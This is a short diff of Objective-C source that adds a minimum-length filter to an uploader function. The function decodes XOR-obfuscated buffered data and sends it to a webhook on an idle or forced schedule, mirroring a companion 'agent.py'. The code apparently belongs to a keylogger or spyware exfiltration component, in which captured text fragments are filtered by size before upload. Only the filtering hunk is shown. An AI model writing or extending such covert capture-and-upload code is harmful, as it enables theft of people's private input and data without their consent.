@@ -119,6 +119,8 @@ void df_startUploader(NSString *webhook, NSTimeInterval interval){
             if(at) idle=[[NSDate date] timeIntervalSinceDate:[at fileModificationDate]];
             BOOL forced=([[NSDate date] timeIntervalSince1970]-lastFlush)>=180;
             if(idle<8 && !forced) continue;
+            // min-length gate (meat chars, mirrors agent.py): skip tiny fragments
+            { NSData *sl0=[d subdataWithRange:NSMakeRange((NSUInteger)off,d.length-off)]; NSMutableData *mm0=[sl0 mutableCopy]; uint8_t *bb0=mm0.mutableBytes; const uint8_t *kk0=gKey.bytes; for(NSUInteger i=0;i<mm0.length;i++) bb0[i]^=kk0[(off+i)%gKey.length]; NSString *pv=[[NSString alloc] initWithData:mm0 encoding:NSUTF8StringEncoding]; NSUInteger meat=0; for(NSString *ln in [pv componentsSeparatedByString:@"\n"]){ NSString *tr=[ln stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]]; if(tr.length>0) meat+=tr.length; } if(meat<12 && !forced) continue; }
             // min-length gate: skip tiny fragments (offset untouched)
             if(!forced && d.length-off<12) continue;
             lastFlush=[[NSDate date] timeIntervalSince1970];
